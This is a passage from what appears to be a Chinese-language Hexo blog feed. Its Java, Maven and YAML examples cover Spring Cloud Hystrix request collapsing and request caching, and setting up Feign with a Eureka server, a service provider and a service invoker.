<ul>
<li>需要有一个执行请求的命令，将全部参数进行整理，然后调用外部服务</li>
<li>需要有一个合并处理器，用于收集请求，以及处理结果</li>
<li>外部接口支持。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CollapseTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="comment">// 收集 1 秒内发生的请求，合并为一个命令执行</span></span><br><span class="line">		ConfigurationManager.getConfigInstance().setProperty(</span><br><span class="line">				<span class="string">"hystrix.collapser.default.timerDelayInMilliseconds"</span>, <span class="number">1000</span>);</span><br><span class="line">		<span class="comment">// 请求上下文</span></span><br><span class="line">		HystrixRequestContext context = HystrixRequestContext</span><br><span class="line">				.initializeContext();</span><br><span class="line">		<span class="comment">// 创建请求合并处理器</span></span><br><span class="line">		MyHystrixCollapser c1 = <span class="keyword">new</span> MyHystrixCollapser(<span class="string">"Angus"</span>);</span><br><span class="line">		MyHystrixCollapser c2 = <span class="keyword">new</span> MyHystrixCollapser(<span class="string">"Crazyit"</span>);</span><br><span class="line">		MyHystrixCollapser c3 = <span class="keyword">new</span> MyHystrixCollapser(<span class="string">"Sune"</span>);</span><br><span class="line">		MyHystrixCollapser c4 = <span class="keyword">new</span> MyHystrixCollapser(<span class="string">"Paris"</span>);</span><br><span class="line">		<span class="comment">// 异步执行</span></span><br><span class="line">		Future&lt;Person&gt; f1 = c1.queue();</span><br><span class="line">		Future&lt;Person&gt; f2 = c2.queue();</span><br><span class="line">		Future&lt;Person&gt; f3 = c3.queue();</span><br><span class="line">		Future&lt;Person&gt; f4 = c4.queue();</span><br><span class="line">		System.out.println(f1.get());</span><br><span class="line">		System.out.println(f2.get());</span><br><span class="line">		System.out.println(f3.get());</span><br><span class="line">		System.out.println(f4.get());</span><br><span class="line">		context.shutdown();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">CollapserCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">Person</span>&gt;&gt; </span>&#123;</span><br><span class="line">		<span class="comment">// 请求集合，第一个类型是单个请求返回的数据类型，第二是请求参数的类型</span></span><br><span class="line">		Collection&lt;CollapsedRequest&lt;Person, String&gt;&gt; requests;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="title">CollapserCommand</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">				Collection&lt;CollapsedRequest&lt;Person, String&gt;&gt; requests)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">super</span>(Setter.withGroupKey(HystrixCommandGroupKey.Factory</span><br><span class="line">					.asKey(<span class="string">"ExampleGroup"</span>)));</span><br><span class="line">			<span class="keyword">this</span>.requests = requests;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> Map&lt;String, Person&gt; <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">			System.out.println(<span class="string">"收集参数后执行命令，参数数量："</span> + requests.size());</span><br><span class="line">			<span class="comment">// 处理参数</span></span><br><span class="line">			List&lt;String&gt; personNames = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">			<span class="keyword">for</span>(CollapsedRequest&lt;Person, String&gt; request : requests) &#123;</span><br><span class="line">				personNames.add(request.getArgument());</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 调用服务（此处模拟调用），根据名称获取Person的Map</span></span><br><span class="line">			Map&lt;String, Person&gt; result = callService(personNames);</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// 模拟服务返回</span></span><br><span class="line">		<span class="function"><span class="keyword">private</span> Map&lt;String, Person&gt; <span class="title">callService</span><span class="params">(List&lt;String&gt; personNames)</span> </span>&#123;</span><br><span class="line">			Map&lt;String, Person&gt; result = <span class="keyword">new</span> HashMap&lt;String, Person&gt;();</span><br><span class="line">			<span class="keyword">for</span>(String personName : personNames) &#123;</span><br><span class="line">				Person p = <span class="keyword">new</span> Person();</span><br><span class="line">				p.id = UUID.randomUUID().toString();</span><br><span class="line">				p.name = personName;</span><br><span class="line">				p.age = <span class="keyword">new</span> Random().nextInt(<span class="number">30</span>);</span><br><span class="line">				result.put(personName, p);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">		String id;</span><br><span class="line">		String name;</span><br><span class="line">		Integer age;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">"id: "</span> + id + <span class="string">", name: "</span> + name + <span class="string">", age: "</span> + age;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHystrixCollapser</span> <span class="keyword">extends</span></span></span><br><span class="line"><span class="class">			<span class="title">HystrixCollapser</span>&lt;<span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">Person</span>&gt;, <span class="title">Person</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">		String personName;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">MyHystrixCollapser</span><span class="params">(String personName)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">this</span>.personName = personName;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> String <span class="title">getRequestArgument</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> personName;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="keyword">protected</span> HystrixCommand&lt;Map&lt;String, Person&gt;&gt; createCommand(</span><br><span class="line">				Collection&lt;CollapsedRequest&lt;Person, String&gt;&gt; requests) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">new</span> CollapserCommand(requests);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">mapResponseToRequests</span><span class="params">(Map&lt;String, Person&gt; batchResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">				Collection&lt;CollapsedRequest&lt;Person, String&gt;&gt; requests)</span> </span>&#123;</span><br><span class="line">			<span class="comment">// 让结果与请求进行关联</span></span><br><span class="line">			<span class="keyword">for</span> (CollapsedRequest&lt;Person, String&gt; request : requests) &#123;</span><br><span class="line">				<span class="comment">// 获取单个响应返回的结果</span></span><br><span class="line">				Person singleResult = batchResponse.get(request.getArgument());</span><br><span class="line">				<span class="comment">// 关联到请求中</span></span><br><span class="line">				request.setResponse(singleResult);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix8.png" alt="执行结果"></p>
<h3 id="请求缓存"><a href="#请求缓存" class="headerlink" title="请求缓存"></a>请求缓存</h3><p>Hystrix支持缓存功能，如果在一次请求的过程中，多个地方调用同一个接口，可以考虑使用缓存。缓存打开后，下一次的命令不会去执行，直接到缓存中获取响应并返回。</p>
<p>开启缓存较为简单，在命令中重写父类的getCacheKey即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheMain</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;	</span><br><span class="line">		<span class="comment">// 初始化请求上下文</span></span><br><span class="line">		HystrixRequestContext context = HystrixRequestContext.initializeContext();</span><br><span class="line">		<span class="comment">// 请求正常的服务</span></span><br><span class="line">		String key = <span class="string">"cache-key"</span>;</span><br><span class="line">		MyCommand c1 = <span class="keyword">new</span> MyCommand(key);</span><br><span class="line">		MyCommand c2 = <span class="keyword">new</span> MyCommand(key);</span><br><span class="line">		MyCommand c3 = <span class="keyword">new</span> MyCommand(key);</span><br><span class="line">		<span class="comment">// 输出结果</span></span><br><span class="line">		System.out.println(c1.execute() + <span class="string">"c1 是否读取缓存: "</span> + c1.isResponseFromCache());</span><br><span class="line">		System.out.println(c2.execute() + <span class="string">"c2 是否读取缓存: "</span> + c2.isResponseFromCache());</span><br><span class="line">		System.out.println(c3.execute() + <span class="string">"c3 是否读取缓存: "</span> + c3.isResponseFromCache());		</span><br><span class="line">		<span class="comment">// 获取缓存实例</span></span><br><span class="line">		HystrixRequestCache cache = HystrixRequestCache.getInstance(</span><br><span class="line">				HystrixCommandKey.Factory.asKey(<span class="string">"MyCommandKey"</span>), </span><br><span class="line">				HystrixConcurrencyStrategyDefault.getInstance());</span><br><span class="line">		<span class="comment">// 清空缓存</span></span><br><span class="line">		cache.clear(key);		</span><br><span class="line">		<span class="comment">// 重新执行命令</span></span><br><span class="line">		MyCommand c4 = <span class="keyword">new</span> MyCommand(key);</span><br><span class="line">		System.out.println(c4.execute() + <span class="string">"c4 是否读取缓存: "</span> + c4.isResponseFromCache());</span><br><span class="line">		</span><br><span class="line">		context.shutdown();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyCommand</span> <span class="keyword">extends</span> <span class="title">HystrixCommand</span>&lt;<span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">private</span> String key;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="title">MyCommand</span><span class="params">(String key)</span> </span>&#123;</span><br><span class="line">		    <span class="keyword">super</span>(</span><br><span class="line">		    		Setter.withGroupKey(HystrixCommandGroupKey.Factory.asKey(<span class="string">"ExampleGroup"</span>))</span><br><span class="line">		    		.andCommandKey(HystrixCommandKey.Factory.asKey(<span class="string">"MyCommandKey"</span>))</span><br><span class="line">		    		);</span><br><span class="line">		    <span class="keyword">this</span>.key = key;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> String <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">			System.out.println(<span class="string">"执行命令"</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">protected</span> String <span class="title">getCacheKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">this</span>.key;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-24-hystrix10.png" alt="执行结果"></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href>疯狂Spring Cloud微服务架构实战</a></p>
]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Hystrix</tag>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring整合Feign</title>
    <url>/2020/04/24/SpringCloud/2020-04-24-009-Spring%E6%95%B4%E5%90%88Feign/</url>
    <content><![CDATA[<h1 id="Spring整合Feign"><a href="#Spring整合Feign" class="headerlink" title="Spring整合Feign"></a>Spring整合Feign</h1><p>Spring Cloud对Feign进行了封装，我们通过一个例子，说明下如何在Spring中整合Feign。</p>
<h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><p>测试案例主要分为三个部分：</p>
<ol>
<li>spring-feign-server：Eureka服务器端项目，端口为8761，提供服务注册，查询功能</li>
<li>spring-feign-provider：服务提供者。此项目支持通过指定不同的端口号启动多个不同的实例</li>
<li>spring-feign-invoker：服务调用者。它会通过spring-feign-server提供的接口查询到spring-feign-provider提供的服务列表，发起调用，对外提供9000端口服务。</li>
</ol>
<h2 id="spring-feign-server"><a href="#spring-feign-server" class="headerlink" title="spring-feign-server"></a>spring-feign-server</h2><p>本项目的依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>仅仅作为一个Eureka服务器运行，因此，不需要太复杂的逻辑，启动类如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">new</span> SpringApplicationBuilder(ServerApplication<span class="class">.<span class="keyword">class</span>).<span class="title">run</span>(<span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8761</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">registerWithEureka:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">fetchRegistry:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h2 id="spring-feign-provider"><a href="#spring-feign-provider" class="headerlink" title="spring-feign-provider"></a>spring-feign-provider</h2><p>项目的依赖为：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>对外提供了/hello和/person/{personId}两个REST服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/person/&#123;personId&#125;"</span>, method = RequestMethod.GET)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> Person <span class="title">findPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId, HttpServletRequest request) </span>&#123;</span><br><span class="line">		Person person = <span class="keyword">new</span> Person(personId, <span class="string">"Crazyit"</span>, <span class="number">30</span>);</span><br><span class="line">		<span class="comment">// 为了查看结果，将请求的URL设置到Person实例中</span></span><br><span class="line">		person.setMessage(request.getRequestURL().toString());</span><br><span class="line">		<span class="keyword">return</span> person;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(value = <span class="string">"/hello"</span>, method = RequestMethod.GET)</span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"Hello World"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> Integer id;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(Integer id, String name, Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.message = message;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动类如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProviderApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// 读取控制台输入的端口，避免端口冲突</span></span><br><span class="line">		Scanner scan = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">		String port = scan.nextLine();</span><br><span class="line">		<span class="keyword">new</span> SpringApplicationBuilder(ProviderApplication<span class="class">.<span class="keyword">class</span>).<span class="title">properties</span>(</span></span><br><span class="line">				"server.port=" + port).run(args);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>配置文件如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-feign-provider</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="string">localhost</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8761/eureka/</span></span><br></pre></td></tr></table></figure>

<h2 id="spring-feign-invoker"><a href="#spring-feign-invoker" class="headerlink" title="spring-feign-invoker"></a>spring-feign-invoker</h2><p>Invoker项目的依赖为</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-ribbon<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-feign<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.16.18<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>它内部封装了调用provider提供的两个REST服务的逻辑，分别在HelloClient和PersonClient中</p>
<p>HelloClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient</span>(name = <span class="string">"spring-feign-provider"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@MyUrl</span>(method = <span class="string">"GET"</span>, url = <span class="string">"/hello"</span>)</span><br><span class="line">	<span class="function">String <span class="title">myHello</span><span class="params">()</span></span>;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(method = RequestMethod.GET, value = <span class="string">"/hello"</span>)</span><br><span class="line">	<span class="function">String <span class="title">springHello</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PersonClient</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@FeignClient</span>(<span class="string">"spring-feign-provider"</span>) <span class="comment">//声明调用的服务名称</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonClient</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping</span>(method = RequestMethod.GET, value = <span class="string">"/hello"</span>)</span><br><span class="line">	<span class="function">String <span class="title">hello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(method = RequestMethod.GET, value = <span class="string">"/person/&#123;personId&#125;"</span>)</span><br><span class="line">	<span class="function">Person <span class="title">getPerson</span><span class="params">(@PathVariable(<span class="string">"personId"</span>)</span> Integer personId)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Person</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	Integer id;</span><br><span class="line">	String name;</span><br><span class="line">	Integer age;</span><br><span class="line">	String message;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Integer id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.id = id;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(Integer age)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.age = age;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.message = message;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

